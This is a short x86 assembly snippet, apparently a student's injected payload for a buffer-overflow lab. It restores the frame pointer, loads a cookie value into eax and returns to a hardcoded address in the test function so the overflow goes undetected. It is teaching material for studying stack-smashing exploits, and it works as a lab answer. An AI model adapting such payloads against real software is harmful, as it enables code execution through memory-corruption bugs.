lea 40(%esp), %ebp	# Restore value for ebp
push $0x08048DBE	# Store address of instruction just after the calling to getbuf in test function as the return address
mov $0x6cf6dd37, %eax	# Store adminuser cookie in eax
ret			# Return to test function
